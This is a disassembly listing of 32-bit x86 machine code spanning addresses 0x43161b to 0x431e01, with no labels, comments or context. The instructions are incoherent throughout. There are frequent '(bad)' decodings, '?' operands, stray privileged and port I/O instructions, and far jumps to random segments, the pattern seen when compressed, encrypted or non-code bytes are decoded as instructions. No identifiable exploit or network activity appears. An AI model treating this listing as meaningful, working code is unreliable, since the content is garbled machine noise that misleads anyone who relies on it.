  43161b:	cmp    bl,BYTE PTR [esi-0x7f]
  43161e:	push   0x7b9088b
  431623:	jbe    0x43162c
  431625:	mov    es,WORD PTR [edi-0x24]
  431628:	dec    edi
  431629:	cli    
  43162a:	xor    al,0x10
  43162c:	and    bh,BYTE PTR [esi-0x76b3e393]
  431632:	sahf   
  431633:	add    eax,0xdf7c4234
  431638:	out    dx,al
  431639:	xchg   ecx,eax
  43163a:	push   ss
  43163b:	adc    al,0x34
  43163d:	mov    bh,0x54
  43163f:	and    BYTE PTR [ecx-0x22],0x7d
  431643:	shl    BYTE PTR [ebp-0x49f79d32],0xc2
  43164a:	pop    esi
  43164b:	xor    BYTE PTR [edx-0x47],bl
  43164e:	retf   0xc168
  431651:	pusha  
  431652:	ret    0x6a60
  431655:	sbb    BYTE PTR [eax+0x41],bh
  431658:	bound  eax,QWORD PTR [ebx]
  43165a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43165b:	je     0x43164b
  43165d:	lds    esi,FWORD PTR ss:[ebx+0x30044685]
  431664:	pop    eax
  431665:	dec    ebp
  431666:	inc    esi
  431667:	push   ebp
  431668:	xor    eax,0x66376d6b
  43166d:	push   0x26
  43166f:	mov    ds,ebx
  431671:	mov    dh,ch
  431673:	sub    ecx,DWORD PTR [esp+ebx*8]
  431676:	push   edx
  431677:	inc    edx
  431678:	enter  0x8669,0xb6
  43167c:	or     esi,DWORD PTR [eax+0x68]
  43167f:	xor    al,0x74
  431681:	ror    BYTE PTR [eax+0x2c],0xe8
  431685:	ds cmc 
  431687:	(bad)  
  431689:	sub    al,0xe1
  43168b:	add    BYTE PTR ds:0x42f79011,bl
  431691:	push   0xae7d484d
  431696:	pop    ss
  431697:	jmp    0xd855:0xc476997c
  43169e:	xor    BYTE PTR [eax],dl
  4316a0:	push   es
  4316a1:	mov    fs,WORD PTR [ebp-0x4495b476]
  4316a7:	out    dx,al
  4316a8:	cmp    al,0x0
  4316aa:	xor    edx,edi
  4316ac:	imul   esi,DWORD PTR [edi-0x60],0xffffffb3
  4316b0:	mov    BYTE PTR [edx-0x70],bh
  4316b3:	push   ecx
  4316b4:	pusha  
  4316b5:	ins    BYTE PTR es:[edi],dx
  4316b6:	rcl    cl,cl
  4316b8:	cli    
  4316b9:	adc    esi,0xfffffff4
  4316bc:	ins    BYTE PTR es:[edi],dx
  4316bd:	sub    eax,0xde1d9544
  4316c2:	lock call 0xb622:0xc7884014
  4316ca:	mov    esp,edx
  4316cc:	push   ds
  4316cd:	aad    0xea
  4316cf:	and    edx,ebx
  4316d1:	icebp  
  4316d2:	push   eax
  4316d3:	fild   DWORD PTR [ebp-0x311da8a]
  4316d9:	push   es
  4316da:	mov    ?,WORD PTR [ebp+edx*1+0x9]
  4316de:	shr    DWORD PTR [eax-0x38],0xc
  4316e2:	into   
  4316e3:	cmp    edx,DWORD PTR [edx+0x6e3cc1b0]
  4316e9:	in     al,0x9c
  4316eb:	and    al,0xed
  4316ed:	xchg   esp,eax
  4316ee:	jo     0x4316f4
  4316f0:	bound  eax,QWORD PTR [ebx-0x2c]
  4316f3:	cwde   
  4316f4:	iret   
  4316f5:	push   es
  4316f6:	or     al,0x65
  4316f8:	xor    eax,0x18b42405
  4316fd:	push   0x1556e534
  431702:	xor    al,0x15
  431704:	fimul  DWORD PTR [edi+0x2e54841c]
  43170a:	in     al,0xa8
  43170c:	test   BYTE PTR [esi],ah
  43170e:	rol    DWORD PTR [eax+edi*1-0x46],1
  431712:	mov    gs,WORD PTR [ecx]
  431714:	or     DWORD PTR [eax+0x44],0xcac300bb
  43171b:	fs push esi
  43171d:	js     0x431733
  43171f:	jo     0x431722
  431721:	bound  ebp,QWORD PTR [ebx-0x41]
  431724:	sbb    dl,bh
  431726:	mov    dh,0x6
  431728:	(bad)  [ecx+0x6f7bdeb8]
  43172e:	cmp    cl,BYTE PTR [esi]
  431730:	inc    eax
  431731:	cli    
  431732:	jo     0x431787
  431734:	cmp    BYTE PTR [eax+esi*4+0x1ba1496b],dh
  43173b:	out    0xcc,al
  43173d:	adc    eax,DWORD PTR [ebx]
  43173f:	addr16 mov al,ds:0x9a89
  431743:	or     dh,ch
  431745:	pop    es
  431746:	xchg   BYTE PTR [esi+0x15],dl
  431749:	outs   dx,BYTE PTR ds:[esi]
  43174a:	adc    BYTE PTR [eax+edi*4-0x5c],dl
  43174e:	aam    0x3
  431750:	pop    esi
  431751:	adc    esp,DWORD PTR [edi-0x44ed437e]
  431757:	hlt    
  431758:	pop    eax
  431759:	fst    st(7)
  43175b:	and    DWORD PTR [edi+ebx*1-0x6b0d7dee],0x20
  431763:	add    DWORD PTR [ebp+0x51],ecx
  431766:	(bad)  
  431767:	pop    edi
  431768:	fsub   DWORD PTR [eax+edi*8+0x76de96]
  43176f:	dec    ebx
  431770:	mov    ds:0xe644a184,al
  431775:	dec    esi
  431776:	add    eax,0x3ac0ad89
  43177b:	scas   al,BYTE PTR es:[edi]
  43177c:	xchg   ebx,eax
  43177d:	pop    esi
  43177e:	xor    bh,cl
  431780:	push   ss
  431781:	pusha  
  431782:	data16 jbe 0x43178a
  431785:	jecxz  0x431738
  431787:	les    ebx,FWORD PTR [edx+esi*8]
  43178a:	scas   al,BYTE PTR es:[edi]
  43178b:	bound  esi,QWORD PTR [edx-0x4a5e9722]
  431791:	jle    0x4317df
  431793:	das    
  431794:	add    cl,0x2c
  431797:	dec    esp
  431798:	add    bl,cl
  43179a:	pop    edx
  43179b:	mov    fs,WORD PTR [ebp-0x39053df2]
  4317a1:	(bad)  
  4317a2:	lock adc edx,ebx
  4317a5:	(bad)  
  4317a6:	mov    ds:0x28f546d6,al
  4317ab:	xchg   BYTE PTR cs:[edx+0xda40170],ch
  4317b2:	imul   BYTE PTR [eax]
  4317b4:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4317b6:	cli    
  4317b7:	je     0x43180b
  4317b9:	jne    0x43181f
  4317bb:	je     0x4317e3
  4317bd:	ins    BYTE PTR es:[edi],dx
  4317be:	(bad)  
  4317bf:	and    eax,0xa35c6de
  4317c4:	cdq    
  4317c5:	cmp    eax,ecx
  4317c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4317c8:	push   ecx
  4317c9:	sub    al,0xee
  4317cb:	data16 out dx,al
  4317cd:	xor    cl,BYTE PTR [esi+0x68]
  4317d0:	pusha  
  4317d1:	ins    BYTE PTR es:[edi],dx
  4317d2:	dec    ebp
  4317d3:	lods   al,BYTE PTR ds:[esi]
  4317d4:	jl     0x431822
  4317d6:	cmp    BYTE PTR [ecx],bl
  4317d8:	xchg   edx,eax
  4317d9:	loopne 0x431774
  4317db:	pop    eax
  4317dc:	fs mov esi,0x95320e4d
  4317e2:	adc    BYTE PTR [ebp+0x15],0xb6
  4317e6:	int3   
  4317e7:	sub    BYTE PTR gs:[eax+0x16],al
  4317eb:	mov    esp,0x7e5c460c
  4317f0:	adc    dl,BYTE PTR [eax]
  4317f2:	inc    esi
  4317f3:	add    DWORD PTR [edx+0x500ba360],edx
  4317f9:	stos   DWORD PTR es:[edi],eax
  4317fa:	xor    BYTE PTR [esi-0x12],ah
  4317fd:	push   0xd55873dc
  431802:	jo     0x431825
  431804:	jmp    0x3109:0x4e04ce46
  43180b:	pop    ds
  43180c:	xchg   BYTE PTR [esi],bh
  43180e:	mov    BYTE PTR [edx+eiz*4+0x5f],dh
  431812:	push   eax
  431813:	push   ds
  431814:	sbb    esi,DWORD PTR [eax]
  431816:	fist   WORD PTR [esi]
  431818:	jl     0x431854
  43181a:	stos   BYTE PTR es:[edi],al
  43181b:	add    al,0x0
  43181d:	adc    al,0xc5
  43181f:	push   0xfa4a5da2
  431824:	clc    
  431825:	push   cs
  431826:	dec    edi
  431827:	bound  edi,QWORD PTR [eax+0x742cae0e]
  43182d:	retf   
  43182e:	and    BYTE PTR [esi],ch
  431830:	xor    ah,ah
  431832:	shr    BYTE PTR [ebx],1
  431834:	or     BYTE PTR [ebx],ch
  431836:	push   edx
  431837:	call   0xb0bc:0xe0b9d445
  43183e:	lock inc ecx
  431840:	ins    BYTE PTR es:[edi],dx
  431841:	ja     0x431844
  431843:	jle    0x43184a
  431845:	mov    ecx,0x61f10122
  43184a:	pop    esp
  43184b:	std    
  43184c:	add    BYTE PTR [esi-0x48649fa8],al
  431852:	mov    esi,0x575d0
  431857:	jmp    0x431885
  431859:	hlt    
  43185a:	retf   0xc81e
  43185d:	jge    0x4317ff
  43185f:	dec    edi
  431860:	xchg   edx,eax
  431861:	imul   BYTE PTR [ebp-0x36]
  431864:	or     eax,0x2d295c28
  431869:	fadd   QWORD PTR [edx-0x50f4df2]
  43186f:	add    BYTE PTR [edi-0x18],0xa1
  431873:	ss fs clc 
  431876:	fstp   TBYTE PTR [ecx+esi*2-0x33]
  43187a:	adc    BYTE PTR [esi+0x10],cl
  43187d:	push   edi
  43187e:	(bad)  
  43187f:	mov    esp,0x32bc9823
  431884:	mov    esi,0x2642140c
  431889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43188a:	cmp    BYTE PTR [ecx-0x2ba95958],ah
  431890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431891:	sbb    ecx,DWORD PTR [esi]
  431893:	mov    edi,0x22ac6de2
  431898:	add    eax,0x3c9916cd
  43189d:	repnz lds esp,FWORD PTR [edx-0x51da5fde]
  4318a4:	hlt    
  4318a5:	fild   DWORD PTR fs:[edi]
  4318a8:	test   BYTE PTR [esp+ebp*1-0x53828f50],ah
  4318af:	call   0x59f2:0x5a99e90a
  4318b6:	ffreep st(4)
  4318b8:	mov    dl,0xb8
  4318ba:	ret    0xd66
  4318bd:	mov    eax,ds:0xa424bc0
  4318c2:	inc    esi
  4318c3:	add    eax,0x4912684e
  4318c8:	iret   
  4318c9:	push   esp
  4318ca:	push   esp
  4318cb:	sbb    ch,BYTE PTR [esi]
  4318cd:	cld    
  4318ce:	inc    ebx
  4318cf:	mov    eax,ds:0x9c2668ad
  4318d4:	inc    esi
  4318d5:	sub    edi,edi
  4318d7:	mov    ch,bl
  4318d9:	push   0xd87556d0
  4318de:	jbe    0x43194a
  4318e0:	pop    esi
  4318e1:	nop
  4318e2:	add    DWORD PTR [edx-0x16fb73e1],ecx
  4318e8:	imul   ebp,eax,0x8af40a68
  4318ee:	push   eax
  4318ef:	sub    bl,BYTE PTR [ebx]
  4318f1:	mov    esp,0x1560d804
  4318f6:	or     BYTE PTR [esi+edi*1],0x4
  4318fa:	push   cs
  4318fb:	dec    edx
  4318fc:	sti    
  4318fd:	mov    cl,0xa3
  4318ff:	loop   0x43195c
  431901:	mov    BYTE PTR [esi-0x60],bh
  431904:	mov    bh,BYTE PTR [eax+0x19]
  431907:	neg    eax
  431909:	lock and eax,0x117a836c
  43190f:	(bad)  
  431910:	mov    DWORD PTR [eax+0x3900bd40],ebx
  431916:	pop    esi
  431917:	pop    eax
  431918:	mov    ds:0x927ea337,al
  43191d:	mov    al,0x55
  43191f:	sbb    al,dl
  431921:	fs repz jl 0x431900
  431925:	neg    eax
  431927:	gs push ebp
  431929:	clc    
  43192a:	pusha  
  43192b:	stos   DWORD PTR es:[edi],eax
  43192c:	fs xchg edi,eax
  43192e:	or     bl,BYTE PTR [esi-0x65f9b5c1]
  431934:	jle    0x4318c1
  431936:	imul   BYTE PTR [edi+0x5b61ee18]
  43193c:	xor    BYTE PTR [edi+ecx*8+0x62],ch
  431940:	adc    eax,0x22f9d34
  431945:	dec    eax
  431946:	int    0x14
  431948:	call   0x2486:0x2632e8e2
  43194f:	or     cl,BYTE PTR [edi+ebp*1]
  431952:	inc    edx
  431953:	cmp    dh,al
  431955:	adc    ebp,DWORD PTR [edx-0x2d82b474]
  43195b:	test   al,0x70
  43195d:	push   cs
  43195e:	add    bl,BYTE PTR [eax-0x20eafa7c]
  431964:	nop
  431965:	rol    BYTE PTR [edx+0x16],1
  431968:	shl    DWORD PTR [edx+0x65],1
  43196b:	cmp    al,0x12
  43196d:	pop    ds
  43196e:	test   BYTE PTR [esi+0x66a7259c],bl
  431974:	shl    BYTE PTR [edx+ebp*2],cl
  431977:	or     dl,BYTE PTR [esi]
  431979:	ins    BYTE PTR es:[edi],dx
  43197a:	fist   WORD PTR [edi+0x78]
  43197d:	outs   dx,BYTE PTR ds:[esi]
  43197e:	adc    BYTE PTR [edi+0x39b436ff],bl
  431984:	add    DWORD PTR [edx],ecx
  431986:	jl     0x431942
  431988:	or     edi,eax
  43198a:	scas   eax,DWORD PTR es:[edi]
  43198b:	fs cmp al,0xe0
  43198e:	fidiv  WORD PTR [edx]
  431990:	clc    
  431991:	sub    esi,eax
  431993:	add    BYTE PTR [edx+0x421d1384],al
  431999:	push   ebx
  43199a:	(bad)  
  43199b:	mov    eax,0x850ae2a0
  4319a0:	test   BYTE PTR [esi-0x59ec35fd],ah
  4319a6:	dec    ecx
  4319a7:	push   eax
  4319a8:	je     0x431963
  4319aa:	add    BYTE PTR [esi],0x7a
  4319ad:	push   ecx
  4319ae:	pop    esi
  4319af:	push   eax
  4319b0:	fwait
  4319b1:	jl     0x4319d7
  4319b3:	mov    cl,BYTE PTR [esi+esi*8+0x3b]
  4319b7:	jb     0x4319c0
  4319b9:	out    0xda,al
  4319bb:	fsubr  DWORD PTR [esi+0x46f62041]
  4319c1:	iret   
  4319c2:	mov    esp,DWORD PTR [ebx-0x6f16ffc0]
  4319c8:	ror    edx,1
  4319ca:	cmp    al,0x8f
  4319cc:	pusha  
  4319cd:	mov    bl,0x4d
  4319cf:	push   0x46a482be
  4319d4:	and    bl,BYTE PTR [ebx+edx*1]
  4319d7:	test   DWORD PTR [esi+0x51],ebx
  4319da:	js     0x4319e1
  4319dc:	rcl    BYTE PTR [esi],cl
  4319de:	data16 mov ah,0x65
  4319e1:	lds    ebp,FWORD PTR [eax-0x56]
  4319e4:	dec    edi
  4319e5:	nop
  4319e6:	push   esi
  4319e7:	mov    esi,0xe1a0a2de
  4319ec:	push   esp
  4319ed:	dec    ecx
  4319ee:	push   edx
  4319ef:	sub    al,0x24
  4319f1:	pusha  
  4319f2:	cmp    DWORD PTR [esi+0x513424a2],ecx
  4319f8:	sub    BYTE PTR [eax+0x1c],dl
  4319fb:	push   ds
  4319fc:	inc    edx
  4319fd:	hlt    
  4319fe:	jmp    0x3dc:0xc2f4923
  431a05:	sub    DWORD PTR [edx-0x5d5d5573],0x50ed326b
  431a0f:	fild   WORD PTR [eax]
  431a11:	cs int 0xba
  431a14:	sub    BYTE PTR [edi],dh
  431a16:	push   ss
  431a17:	jbe    0x4319a8
  431a19:	sub    al,0xce
  431a1c:	mov    eax,ds:0xc4150d45
  431a21:	xchg   esi,eax
  431a22:	push   cs
  431a23:	and    BYTE PTR [esi+0x2a],ch
  431a26:	enter  0x1c3b,0xd0
  431a2a:	mov    cl,0x14
  431a2c:	retf   
  431a2d:	sub    bl,BYTE PTR cs:[esi-0x76]
  431a31:	sbb    DWORD PTR [eax+0x70],ebx
  431a34:	imul   ecx,DWORD PTR [eax+0x6b34f1],0xfffffff9
  431a3b:	ins    BYTE PTR es:[edi],dx
  431a3c:	int3   
  431a3d:	inc    eax
  431a3e:	and    eax,0xc05d5474
  431a43:	jl     0x431a69
  431a45:	and    ebx,esi
  431a47:	sub    ebp,DWORD PTR ds:0x60cd05b5
  431a4d:	sar    BYTE PTR [edx+0x41df018],1
  431a53:	sub    eax,0x71d8e803
  431a58:	fs add al,0x0
  431a5b:	or     dh,BYTE PTR [esi]
  431a5d:	fdivr  st,st(4)
  431a5f:	inc    ecx
  431a60:	clc    
  431a61:	mov    ds:0xa484e41e,al
  431a66:	hlt    
  431a67:	mov    ds:0x524310ec,al
  431a6c:	repnz lods al,BYTE PTR ds:[esi]
  431a6e:	test   BYTE PTR [ebp-0x4efd1f4b],0x30
  431a75:	mov    WORD PTR [edx+edx*8-0x2590ccbe],gs
  431a7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431a7d:	in     al,dx
  431a7e:	nop
  431a7f:	sbb    al,0xaa
  431a81:	add    BYTE PTR ds:0xd8938e99,ch
  431a87:	bound  eax,QWORD PTR [edi-0x503949b0]
  431a8d:	int3   
  431a8e:	inc    edi
  431a8f:	les    esi,FWORD PTR [esi+0x6b2ed5b0]
  431a95:	xor    bh,dl
  431a97:	fs adc al,0x45
  431a9a:	sbb    ebp,ecx
  431a9c:	inc    ebx
  431a9d:	adc    al,0x9a
  431a9f:	add    dl,0xb3
  431aa2:	add    BYTE PTR [esp+ebx*1-0x1be656ba],ch
  431aa9:	adc    al,0x8a
  431aab:	and    BYTE PTR [ebx+0x14],bl
  431aae:	je     0x431acd
  431ab0:	rcl    WORD PTR [esi],0xb0
  431ab4:	js     0x431b2f
  431ab6:	inc    eax
  431ab7:	add    BYTE PTR [esi+0x52a82ad0],ch
  431abd:	adc    DWORD PTR [edx+0x7e],ebx
  431ac0:	mov    ?,esp
  431ac2:	pop    ebp
  431ac3:	and    DWORD PTR [edx-0x7fc3ec8b],esp
  431ac9:	pop    eax
  431aca:	addr16 rcl ecx,1
  431acd:	pusha  
  431ace:	clc    
  431acf:	jb     0x431aa2
  431ad1:	repz pop esp
  431ad3:	enter  0x72fb,0x9c
  431ad7:	jecxz  0x431aa9
  431ad9:	les    edx,FWORD PTR [esi+0x46]
  431adc:	or     bl,BYTE PTR [ebx+ebp*8]
  431adf:	xor    al,0xc2
  431ae1:	stos   BYTE PTR es:[edi],al
  431ae2:	aam    0x1
  431ae4:	xor    BYTE PTR [esi-0x11edb41c],0xa3
  431aeb:	jmp    0xf8c5:0xd0528259
  431af2:	out    dx,al
  431af3:	add    BYTE PTR [ebp+0x1e],dl
  431af6:	shl    BYTE PTR [edi+0x18],cl
  431af9:	xchg   ebp,eax
  431afa:	ror    BYTE PTR [eax-0x244c38d4],0xa3
  431b01:	mov    al,ds:0xd449be9f
  431b06:	fdiv   QWORD PTR [eax+ebp*1]
  431b09:	imul   edx,DWORD PTR [esi],0xc0d2a84b
  431b0f:	add    dh,ch
  431b11:	jp     0x431b6e
  431b13:	sbb    BYTE PTR [edi+ecx*1+0x3365da90],dh
  431b1a:	(bad)  
  431b1b:	fld    QWORD PTR [esi]
  431b1d:	loope  0x431aa8
  431b1f:	mov    dl,BYTE PTR cs:[ebx]
  431b22:	sbb    ebp,DWORD PTR [esi-0x3ddf19f7]
  431b28:	sbb    al,0x1b
  431b2a:	xchg   edi,eax
  431b2b:	test   DWORD PTR [esi],ecx
  431b2d:	call   0x13652740
  431b32:	or     ch,BYTE PTR [edi-0x60]
  431b35:	inc    eax
  431b36:	ret    0xe802
  431b39:	aad    0x62
  431b3b:	add    al,0x86
  431b3d:	int3   
  431b3e:	stos   BYTE PTR es:[edi],al
  431b3f:	sub    eax,0x147c941e
  431b44:	mov    ah,0x4f
  431b46:	inc    edx
  431b47:	sbb    eax,DWORD PTR [edx]
  431b49:	arpl   si,di
  431b4b:	add    al,0xe0
  431b4d:	pop    eax
  431b4e:	ins    DWORD PTR es:[edi],dx
  431b4f:	cmp    al,0x94
  431b51:	push   ecx
  431b52:	gs mov al,0x1
  431b55:	(bad)  
  431b56:	jbe    0x431b99
  431b58:	mov    cl,0xe0
  431b5a:	cmc    
  431b5b:	inc    eax
  431b5c:	inc    esp
  431b5d:	daa    
  431b5e:	inc    BYTE PTR [edx+0x3f]
  431b61:	push   ecx
  431b62:	mov    al,ds:0x1c84fda0
  431b67:	rcl    DWORD PTR [eax-0x203eab4],0x23
  431b6e:	lock inc ecx
  431b70:	test   al,0x8a
  431b72:	(bad)  
  431b73:	push   esp
  431b74:	jns    0x431b38
  431b76:	sub    BYTE PTR [edx],0xc5
  431b79:	push   es
  431b7a:	push   0x36e86c44
  431b7f:	or     DWORD PTR [edx-0x2b70be9a],edi
  431b85:	mov    ch,0xdc
  431b87:	inc    esp
  431b88:	mov    DWORD PTR [eax+0x61],esp
  431b8b:	fwait
  431b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431b8e:	arpl   WORD PTR [esp+ebp*2-0x24],bp
  431b92:	cmp    dh,BYTE PTR [eax]
  431b94:	jbe    0x431bee
  431b96:	pusha  
  431b97:	push   0x87e2c94
  431b9c:	xchg   esi,eax
  431b9d:	inc    edi
  431b9e:	pushf  
  431b9f:	es jle 0x431bf5
  431ba2:	test   al,0x70
  431ba4:	or     DWORD PTR [edx],edx
  431ba6:	pop    ecx
  431ba7:	and    al,bh
  431ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431baa:	add    DWORD PTR [edi+0xc],0xc5e88a48
  431bb1:	ror    BYTE PTR [ecx],cl
  431bb3:	je     0x431be2
  431bb5:	inc    eax
  431bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431bb7:	adc    BYTE PTR [esi+0x8],dl
  431bba:	stos   BYTE PTR es:[edi],al
  431bbb:	test   eax,0x9f082384
  431bc0:	neg    dl
  431bc2:	nop
  431bc3:	add    al,0xd3
  431bc5:	pop    ecx
  431bc6:	les    ecx,FWORD PTR [edx]
  431bc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431bc9:	push   esp
  431bca:	sub    BYTE PTR [ebp-0x58],ch
  431bcd:	ret    0x81a
  431bd0:	cmp    al,0xc0
  431bd2:	nop
  431bd3:	sbb    BYTE PTR [edi+0x404dc882],dl
  431bd9:	imul   esp,DWORD PTR [esi+ebp*8],0x7525f899
  431be0:	dec    esi
  431be1:	test   eax,0x74e02e50
  431be6:	test   eax,0xe01e1c00
  431beb:	data16 stos BYTE PTR es:[edi],al
  431bed:	mov    ecx,0x3616d71d
  431bf2:	ret    0x4957
  431bf5:	mov    ah,0xed
  431bf7:	dec    esi
  431bf8:	imul   ecx,DWORD PTR [edi],0xffffff88
  431bfb:	xchg   BYTE PTR ds:0xc8647f36,al
  431c01:	push   0xd425e8b4
  431c06:	mov    cl,0xe0
  431c08:	dec    ebx
  431c09:	stos   BYTE PTR es:[edi],al
  431c0a:	adc    DWORD PTR [esi-0x70cf1256],0x91c20884
  431c14:	xchg   bl,dl
  431c16:	push   0x1
  431c18:	mov    al,ds:0x5a2a90aa
  431c1d:	pop    edx
  431c1e:	loopne 0x431c35
  431c20:	ffreep st(4)
  431c22:	jbe    0x431bc4
  431c24:	pop    es
  431c25:	fadd   QWORD PTR [ecx+0x21]
  431c28:	mov    dl,BYTE PTR [edx]
  431c2a:	call   0x5388d4
  431c2f:	xchg   BYTE PTR [edi+0x1e0826b6],bl
  431c35:	jmp    0x431beb
  431c37:	mov    ds:0x5c3ad0c1,al
  431c3c:	mov    dh,0xeb
  431c3e:	sar    DWORD PTR fs:[ebx],1
  431c41:	jno    0x431c70
  431c43:	jl     0x431c6b
  431c45:	mov    ebx,ss
  431c47:	ins    BYTE PTR es:[edi],dx
  431c48:	bound  ebx,QWORD PTR [ebx-0x5c]
  431c4b:	stos   BYTE PTR es:[edi],al
  431c4c:	out    0x24,al
  431c4e:	dec    esi
  431c4f:	cmp    bh,0x90
  431c52:	in     eax,0x23
  431c54:	add    BYTE PTR [edx],0x7
  431c57:	push   edx
  431c58:	js     0x431cc0
  431c5a:	rcl    BYTE PTR [eax],0xe
  431c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431c5e:	add    ebx,DWORD PTR [eax]
  431c60:	sub    al,0x52
  431c62:	mov    bh,0xa2
  431c64:	(bad)  
  431c66:	and    DWORD PTR [esp+edi*8],eax
  431c69:	dec    ecx
  431c6a:	mov    BYTE PTR [esi],cl
  431c6c:	in     al,dx
  431c6d:	add    cl,BYTE PTR [ebp-0x3f]
  431c70:	inc    edi
  431c71:	test   al,0xee
  431c73:	inc    edi
  431c74:	and    bl,BYTE PTR [ebx]
  431c76:	jmp    0x1e16:0xb86c5d72
  431c7d:	push   edx
  431c7e:	add    BYTE PTR [esi+ecx*8],bl
  431c81:	xchg   edx,eax
  431c82:	xor    DWORD PTR [ebp+0x6f],ebp
  431c85:	push   edx
  431c86:	or     dl,ch
  431c88:	mov    al,ds:0x70000b51
  431c8d:	hlt    
  431c8e:	outs   dx,BYTE PTR ds:[esi]
  431c8f:	dec    edi
  431c90:	adc    al,0x18
  431c92:	icebp  
  431c93:	push   0x3cace758
  431c98:	scas   al,BYTE PTR es:[edi]
  431c99:	jbe    0x431c33
  431c9b:	sbb    al,BYTE PTR ds:0x9088caf2
  431ca1:	sbb    eax,0x208f1ddb
  431ca6:	sub    cl,BYTE PTR [eax-0x33e1cb0c]
  431cac:	dec    eax
  431cad:	dec    ecx
  431cae:	ins    BYTE PTR es:[edi],dx
  431caf:	xor    al,BYTE PTR [edx+0x34]
  431cb2:	push   edx
  431cb3:	jb     0x431d0e
  431cb5:	mov    al,ds:0x76f8537e
  431cba:	aam    0x15
  431cbc:	fcom   st(3)
  431cbe:	fldenv [ebx+0x73]
  431cc1:	add    al,bh
  431cc3:	imul   esp,DWORD PTR es:[eax+eiz*4],0x60
  431cc8:	mov    cl,0x5d
  431cca:	sar    DWORD PTR [eax+0x61],0xb8
  431cce:	lahf   
  431ccf:	(bad)  
  431cd0:	cmp    al,0xcc
  431cd2:	mov    eax,ds:0xa6a06a4d
  431cd7:	dec    ebx
  431cd8:	dec    eax
  431cd9:	xchg   esp,eax
  431cda:	call   0xe2a3935e
  431cdf:	adc    DWORD PTR [esi+ecx*8],0x45b5273
  431ce6:	(bad)  
  431ce8:	stos   BYTE PTR es:[edi],al
  431ce9:	xlat   BYTE PTR ds:[ebx]
  431cea:	push   ebx
  431ceb:	cs cmp dh,dh
  431cee:	mov    ch,0x0
  431cf0:	retf   0xc5e4
  431cf3:	xor    al,0x35
  431cf5:	push   esp
  431cf6:	sub    DWORD PTR [ecx],eax
  431cf8:	sub    DWORD PTR [eax+ebp*1],ebx
  431cfb:	add    BYTE PTR ds:0x291aca30,dh
  431d01:	test   al,0x1e
  431d03:	adc    BYTE PTR [edi+ecx*2],bh
  431d06:	imul   eax,DWORD PTR [ebp+0x7dc4ae10],0x5e1d2205
  431d10:	fidiv  DWORD PTR ss:[eax+0x6fba94e7]
  431d17:	fadd   DWORD PTR [ebx-0x7770b355]
  431d1d:	data16 mov WORD PTR [ebp-0x1457e933],?
  431d24:	xchg   DWORD PTR [ebp+0x6],edx
  431d27:	or     bl,BYTE PTR [esi+edi*2+0x1e]
  431d2b:	pop    eax
  431d2c:	add    BYTE PTR [esi+esi*4+0x2e1a6fb5],cl
  431d33:	inc    edx
  431d34:	lods   al,BYTE PTR ds:[esi]
  431d35:	sar    BYTE PTR [edx],1
  431d37:	(bad)  
  431d38:	and    eax,esp
  431d3a:	(bad)  
  431d3b:	mov    ds:0xb81c6d43,al
  431d40:	in     eax,dx
  431d41:	mov    esi,0xb7e78c3d
  431d46:	add    eax,0x5af65d
  431d4b:	pushf  
  431d4c:	loope  0x431d82
  431d4e:	stos   BYTE PTR es:[edi],al
  431d4f:	loopne 0x431d81
  431d51:	cmp    BYTE PTR [ebx],cl
  431d53:	test   DWORD PTR cs:0x660ca76c,eax
  431d5a:	fs push esp
  431d5c:	call   0x8a57e179
  431d61:	pop    esp
  431d62:	cwde   
  431d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431d64:	int    0xc0
  431d66:	or     ch,BYTE PTR [eax-0x7c]
  431d69:	sbb    dh,dl
  431d6b:	dec    ebp
  431d6c:	pop    eax
  431d6d:	cs ins DWORD PTR es:[edi],dx
  431d6f:	xchg   DWORD PTR [eax],esi
  431d71:	ds loopne 0x431d15
  431d74:	fisttp QWORD PTR [edx]
  431d76:	mov    edi,0x8695def4
  431d7b:	or     ch,BYTE PTR [edx+0x24]
  431d7e:	inc    esp
  431d7f:	scas   al,BYTE PTR es:[edi]
  431d80:	inc    ebx
  431d81:	les    ebp,FWORD PTR ds:[esi]
  431d84:	rol    DWORD PTR [esi-0x43a36dca],0x78
  431d8b:	clc    
  431d8c:	pop    edi
  431d8d:	and    ch,ch
  431d8f:	mov    ds:0x3aa40fa1,eax
  431d94:	ins    BYTE PTR es:[edi],dx
  431d95:	or     dl,dl
  431d97:	mov    edi,0xaa86af4c
  431d9c:	inc    ebx
  431d9d:	adc    esi,edx
  431d9f:	mov    cl,0xc
  431da1:	(bad)  
  431da2:	cmp    BYTE PTR [edx+0x55],ch
  431da5:	fld    DWORD PTR [edx-0x682eab6d]
  431dab:	out    dx,al
  431dac:	jle    0x431d31
  431dae:	mov    al,ds:0x819e9a34
  431db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431db4:	sub    eax,DWORD PTR fs:[edx+0x36124771]
  431dbb:	stos   DWORD PTR es:[edi],eax
  431dbc:	jbe    0x431d50
  431dbe:	cmp    dh,BYTE PTR [eax+0x49]
  431dc1:	mov    ch,0x0
  431dc3:	enter  0x605e,0xbf
  431dc7:	mov    DWORD PTR [esp+esi*4],esi
  431dca:	(bad)  
  431dcb:	jbe    0x431e31
  431dcd:	js     0x431e22
  431dcf:	fiadd  WORD PTR [eax]
  431dd1:	fbld   TBYTE PTR [edi]
  431dd3:	push   0xcd866d87
  431dd8:	mov    esi,0x9818bba8
  431ddd:	xchg   DWORD PTR [edx+ecx*4],eax
  431de0:	lea    edx,[edi]
  431de2:	jp     0x431d67
  431de4:	adc    al,0xb9
  431de6:	in     al,dx
  431de7:	xor    DWORD PTR [ecx-0x6dfdff3],esp
  431ded:	jmp    0xeb42:0x8a0a5b77
  431df4:	xchg   esp,eax
  431df5:	adc    BYTE PTR [ecx-0x24],bh
  431df8:	pop    eax
  431df9:	cld    
  431dfa:	adc    BYTE PTR [ebx+eiz*8+0x3b7292f6],dh
  431e01:	fmul   st,st(2)
